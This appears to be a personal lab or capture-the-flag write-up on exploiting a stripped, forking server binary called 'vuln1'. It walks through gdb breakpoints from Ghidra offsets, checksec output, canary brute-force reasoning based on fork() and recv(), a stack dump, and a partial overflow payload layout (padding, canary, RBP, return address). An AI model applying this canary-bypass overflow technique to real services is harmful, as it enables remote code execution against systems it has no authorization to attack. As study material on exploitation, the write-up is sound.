# Server Fork with recv() - vuln1

fork without execve() child process = canary does not change </br>
recv() = no null terminator '\x00' which makes canary bruteforce possible


### peda start, breakpoint for "NO symbol table" ...
need to get the program started and instantly break/stopped
```
gdb ./binary

gdb-peda$ exec-file binary
#or start or starti
gdb-peda$ starti
```
then
```
gdb-peda$ info proc mappings
gdb-peda$ info files

Entry point: 0x555555555180 , file type elf64-x86-64.
.....
0x0000555555555180 - 0x0000555555555651 is .text
....
0x00007ffff7fd6090 - 0x00007ffff7ff3ff0 is .text in /lib64/ld-linux-x86-64.so.2


gdb-peda$ b *0x555555555180
```
</br>
entry at 0x555555555180 = 00101180 from ghidra

```
                             undefined __stdcall entry(undefined8 param_1, undefined8
             undefined         AL:1           <RETURN>
             undefined8        RDI:8          param_1
             undefined8        RSI:8          param_2
             undefined8        RDX:8          param_3
             undefined8        Stack[-0x10]:8 local_10                                XREF[1]:     0010118e(*)  
                             entry                                           XREF[5]:     Entry Point(*), 00100018(*), 
                                                                                          001020c0, 00102118(*), 
                                                                                          _elfSectionHeaders::00000390(*)  
        00101180 31 ed           XOR        EBP,EBP
```
Want to break at 001014ec from ghidra :
```
        001014ec eb b4           JMP        LAB_001014a2
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined8 __stdcall break-func (uint param_1)
             undefined8        RAX:8          <RETURN>
``` 
</br>

set breakpoint = 0x0000555555555180  + 0x001014ec - 0x00101180 = 0x00005555555554EC </br>
After `gdb-peda$ starti `  </br>
`gdb-peda$  b *0x00005555555554EC ` </br>
!!note!! might have to kill old process if gdb-peda or nc (if binary is a server) did not exit correctly, then restart.

`killall nc ; killall binary `

### checksec 
```
gef➤  checksec
[+] checksec for 'vuln1'
Canary                        : Yes →  value: 0x4635cf1eaee08a00
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Partial
```
fork child process = canary does not change
recv() = no null terminator '\x00' which makes canary bruteforce possible

```
# nc 127.0.0.1 1337
Please enter the message you want to send to admin:
aaaaaaaaaaaaaaaaaaaaabbccc
Done.
```
'vuln1' uses libc.so.6 = libc leak, since the program returns after sending input
stripped = no symbol table, so no 'b main', use starti then set break point with ghidra reference
```
# file vuln1 
vuln1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter 
/lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f,
 stripped

# ldd vuln1 
	linux-vdso.so.1 (0x00007ffc2df84000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd437426000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fd437603000)

```

ghidra: break at 001015cc right after recv() or 001015e1 after stack canary check
```
001015c7 e8 64 fa        CALL       recv                                             ssize_t recv(int __fd, void * __
         ff ff
001015cc 90              NOP
001015cd 48 8b 55 f8     MOV        RDX,qword ptr [RBP + local_10]
001015d1 64 48 33        XOR        RDX,qword ptr FS:[0x28]
         14 25 28 
         00 00 00
001015da 74 05           JZ         LAB_001015e1
001015dc e8 8f fa        CALL       __stack_chk_fail                                 undefined __stack_chk_fail()
         ff ff
                     -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
                     LAB_001015e1                                    XREF[1]:     001015da(j)  
001015e1 c9              LEAVE
001015e2 c3              RET
```
starti, then check canary
Need to set detach-on-fork, and follow-fork-mode in order to debug child process


```
gef >

starti
set detach-on-fork off
set follow-fork-mode child
b *0x00005555555555e2
canary
c
```
[https://vagmour.eu/persistence-1/](https://vagmour.eu/persistence-1/)
[]()
[]()

Send Payload (python3):
```
payload = b'a' * 0x34 + b'cccc' 
netcat( '127.0.0.1', 1337 , payload , i  , []  )
```

After sending payload:  (  Canary = 0x4769534786267b00 ) </br>
RBP =  0x00007fffffffe0e0
```
$rax   : 0x39              
$rbx   : 0x0               
$rcx   : 0x00007ffff7ef444d  →  0x6b77fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe0b8  →  0x0000555555555562  →   mov eax, DWORD PTR [rbp-0x14]
$rbp   : 0x00007fffffffe0e0  →  0x00007fffffffe140  →  0x00005555555555f0  →   push r15
$rsi   : 0x00007fffffffe070  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rdi   : 0x4               
$rip   : 0x00005555555555e2  →   ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x0000555555555180  →   xor ebp, ebp
$r13   : 0x00007fffffffe220  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 

gef➤  x/20gx $rsi
0x7fffffffe070:	0x6161616161616161	0x6161616161616161
0x7fffffffe080:	0x6161616161616161	0x6161616161616161
0x7fffffffe090:	0x6161616161616161	0x6161616161616161
0x7fffffffe0a0:	0x6363636361616161	0x4769534786267b00
0x7fffffffe0b0:	0x00007fffffffe0e0	0x0000555555555562
0x7fffffffe0c0:	0x0000000000000002	0x0000000400000000
0x7fffffffe0d0:	0x0000000000000000	0x4769534786267b00
0x7fffffffe0e0:	0x00007fffffffe140	0x00005555555554cf
0x7fffffffe0f0:	0x00007fffffffe228	0x00000001f7e9d745
0x7fffffffe100:	0x0000000000000000	0x0000053900000010

```
![rsi](stack1.JPG "rsi")

so payload = 

```
payload = b'a' * 0x34 + b'cccc' + CANARY + RBP + RETURN
```